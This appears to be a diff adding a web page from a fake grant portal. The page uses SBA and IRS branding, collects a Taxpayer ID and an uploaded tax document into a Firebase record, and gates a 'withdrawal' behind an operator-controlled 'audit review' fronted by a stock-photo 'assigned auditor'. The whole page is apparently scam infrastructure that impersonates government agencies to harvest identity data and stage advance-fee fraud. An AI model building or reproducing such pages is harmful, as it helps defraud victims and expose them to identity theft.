@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>SBA | Tax Compliance</title>
+  <link rel="stylesheet" href="global.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body { padding-bottom: calc(var(--dock-h) + var(--sp-8)); }
+  </style>
+</head>
+<body>
+
+  <div class="page-loader" id="pageLoader">
+    <div class="page-loader__spinner"></div>
+    <p class="page-loader__text">Loading…</p>
+  </div>
+
+  <header class="page-header">
+    <a href="dashboard.html" class="page-header__back"><i class="fa-solid fa-arrow-left"></i></a>
+    <div class="page-header__logo">SBA</div>
+    <div style="flex:1;">
+      <div class="page-header__title">Tax Compliance</div>
+      <span class="page-header__sub">IRS Form 1099-G · Rev. 2026</span>
+    </div>
+    <a href="dashboard.html" class="page-header__action"><i class="fa-solid fa-times"></i></a>
+  </header>
+
+  <div style="max-width:480px;margin:0 auto;padding:var(--sp-5) var(--sp-4);">
+
+    <!-- FORM VIEW -->
+    <div id="taxFormView" style="display:none;">
+      <div class="alert alert--info" style="margin-bottom:var(--sp-5);">
+        <i class="fa-solid fa-circle-info"></i>
+        <span>Grant disbursement requires a valid tax compliance verification for the current filing cycle.</span>
+      </div>
+
+      <div class="card card--shadow" style="padding:var(--sp-5);">
+        <div style="display:flex;flex-direction:column;gap:var(--sp-4);">
+          <div class="form-row">
+            <div class="form-group">
+              <label class="form-label form-label--required">Taxpayer ID (TIN)</label>
+              <input type="tel" id="tinNumber" class="form-input" placeholder="00-0000000">
+              <span class="field-error" id="tinErr">TIN is required.</span>
+            </div>
+            <div class="form-group">
+              <label class="form-label form-label--required">Tax Year</label>
+              <select id="taxYear" class="form-select">
+                <option value="2025/2026">2025 / 2026</option>
+                <option value="2024">2024</option>
+              </select>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="form-label form-label--required">Tax Compliance Document</label>
+            <div class="upload-area" id="taxUploadArea" onclick="document.getElementById('taxFileInput').click()">
+              <img id="taxPreview" style="display:none;position:absolute;inset:0;width:100%;height:100%;object-fit:cover;border-radius:var(--r-lg);" alt="Tax document preview">
+              <i class="fa-solid fa-file-invoice-dollar upload-area__icon"></i>
+              <div class="upload-area__label">Upload tax document or stamp</div>
+              <div style="font-size:var(--text-xs);color:var(--text-muted);margin-top:4px;">PNG, JPG accepted</div>
+              <input type="file" id="taxFileInput" style="display:none;" accept="image/*">
+            </div>
+            <span class="field-error" id="taxFileErr">Please upload your tax document.</span>
+          </div>
+
+          <button id="taxSubmitBtn" class="btn btn--primary btn--full btn--lg">
+            Submit for Review <i class="fa-solid fa-arrow-right" style="font-size:0.8rem;"></i>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- PENDING VIEW -->
+    <div id="taxPendingView" style="display:none;">
+      <div class="card card--shadow status-view">
+        <div class="status-view__icon status-view__icon--pending">
+          <i class="fa-solid fa-clock"></i>
+        </div>
+        <div class="status-view__title">Under Audit Review</div>
+        <p class="status-view__desc">Your tax compliance documents are being reviewed. This typically completes within 24 hours.</p>
+        <button id="cancelTaxBtn" class="btn btn--ghost btn--lg">Cancel &amp; Resubmit</button>
+      </div>
+    </div>
+
+    <!-- SUCCESS VIEW -->
+    <div id="taxSuccessView" style="display:none;">
+      <div class="card card--shadow status-view">
+        <div class="status-view__icon status-view__icon--success">
+          <i class="fa-solid fa-circle-check"></i>
+        </div>
+        <div class="status-view__title">Compliance Verified</div>
+        <p class="status-view__desc">Your tax compliance has been confirmed. You may now proceed with your withdrawal.</p>
+        <a href="withdraw.html" class="btn btn--success btn--lg">Proceed to Withdrawal</a>
+      </div>
+    </div>
+
+    <!-- DENIED VIEW -->
+    <div id="taxDeniedView" style="display:none;">
+      <div class="card card--shadow status-view">
+        <div class="status-view__icon status-view__icon--error">
+          <i class="fa-solid fa-circle-xmark"></i>
+        </div>
+        <div class="status-view__title">Verification Failed</div>
+        <div class="alert alert--error" style="text-align:left;max-width:320px;margin:0 auto var(--sp-6);">
+          <i class="fa-solid fa-circle-exclamation"></i>
+          <span id="taxDenyReason">Document could not be verified.</span>
+        </div>
+        <button id="retryTaxBtn" class="btn btn--primary btn--lg">Retry Submission</button>
+      </div>
+    </div>
+
+    <!-- Agent card -->
+    <div style="margin-top:var(--sp-5);">
+      <a href="support.html" class="agent-card">
+        <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=120" class="agent-card__avatar" alt="Officer">
+        <div>
+          <div class="agent-card__name">Sarah Miller — Assigned Auditor</div>
+          <div class="agent-card__status"><i class="fa-solid fa-circle" style="font-size:6px;margin-right:4px;"></i> Online · Chat for help</div>
+        </div>
+        <i class="fa-solid fa-chevron-right agent-card__chevron"></i>
+      </a>
+    </div>
+
+  </div>
+
+  <nav class="bottom-dock">
+    <a href="dashboard.html" class="dock-item"><i class="fa-solid fa-house"></i><span>Home</span></a>
+    <a href="ledger.html" class="dock-item"><i class="fa-solid fa-list-ul"></i><span>Ledger</span></a>
+    <a href="kyc.html" class="dock-item dock-item--cta"><i class="fa-solid fa-shield-halved"></i></a>
+    <a href="support.html" class="dock-item"><i class="fa-solid fa-headset"></i><span>Support</span></a>
+    <a href="settings.html" class="dock-item"><i class="fa-solid fa-user-gear"></i><span>Settings</span></a>
+  </nav>
+
+  <script type="module">
+    import { auth, db } from './firebase-config.js';
+    import { doc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+    import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+    let compressedDoc = null;
+
+    function switchView(id) {
+      ['taxFormView','taxPendingView','taxSuccessView','taxDeniedView'].forEach(v => {
+        document.getElementById(v).style.display = v === id ? 'block' : 'none';
+      });
+    }
+
+    document.getElementById('taxFileInput').addEventListener('change', (e) => {
+      const file = e.target.files[0];
+      if (!file) return;
+      const reader = new FileReader();
+      reader.onload = (ev) => {
+        const img = new Image();
+        img.src = ev.target.result;
+        img.onload = () => {
+          const canvas = document.createElement('canvas');
+          const scale  = 600 / img.width;
+          canvas.width = 600; canvas.height = img.height * scale;
+          canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
+          compressedDoc = canvas.toDataURL('image/jpeg', 0.65);
+          const prev = document.getElementById('taxPreview');
+          prev.src = compressedDoc; prev.style.display = 'block';
+          document.getElementById('taxUploadArea').classList.add('has-file');
+        };
+      };
+      reader.readAsDataURL(file);
+    });
+
+    onAuthStateChanged(auth, (user) => {
+      if (!user) { location.href = 'login.html'; return; }
+
+      onSnapshot(doc(db, 'users', user.uid), (snap) => {
+        document.getElementById('pageLoader').style.display = 'none';
+        if (!snap.exists()) return;
+        const d = snap.data();
+        const status = d.taxStatus || 'IDLE';
+
+        if (['PENDING','PENDING_VALIDATION'].includes(status)) {
+          switchView('taxPendingView');
+        } else if (['SUCCESSFUL','VERIFIED','APPROVED'].includes(status)) {
+          switchView('taxSuccessView');
+        } else if (['DECLINED','REJECTED','FAILED'].includes(status)) {
+          switchView('taxDeniedView');
+          document.getElementById('taxDenyReason').textContent = d.taxDenialReason || d.taxNote || 'Document could not be verified. Please resubmit.';
+        } else {
+          switchView('taxFormView');
+        }
+      });
+
+      document.getElementById('taxSubmitBtn').addEventListener('click', async () => {
+        const tin = document.getElementById('tinNumber').value.trim();
+        let valid = true;
+        if (!tin) { document.getElementById('tinErr').classList.add('show'); valid = false; }
+        else document.getElementById('tinErr').classList.remove('show');
+        if (!compressedDoc) { document.getElementById('taxFileErr').classList.add('show'); valid = false; }
+        else document.getElementById('taxFileErr').classList.remove('show');
+        if (!valid) return;
+
+        const btn = document.getElementById('taxSubmitBtn');
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i>&nbsp; Submitting…';
+
+        try {
+          await updateDoc(doc(db, 'users', user.uid), {
+            taxStatus:       'PENDING',
+            taxProof:        compressedDoc,
+            taxPayerID:      tin,
+            taxYear:         document.getElementById('taxYear').value,
+            taxSubmittedAt:  new Date().toISOString()
+          });
+        } catch (err) {
+          btn.disabled = false;
+          btn.innerHTML = 'Submit for Review <i class="fa-solid fa-arrow-right" style="font-size:0.8rem;"></i>';
+          alert('Submission failed: ' + err.message);
+        }
+      });
+
+      document.getElementById('cancelTaxBtn')?.addEventListener('click', async () => {
+        await updateDoc(doc(db, 'users', user.uid), { taxStatus: 'IDLE' });
+      });
+
+      document.getElementById('retryTaxBtn')?.addEventListener('click', async () => {
+        await updateDoc(doc(db, 'users', user.uid), { taxStatus: 'IDLE' });
+      });
+    });
+  </script>
+</body>
+</html>
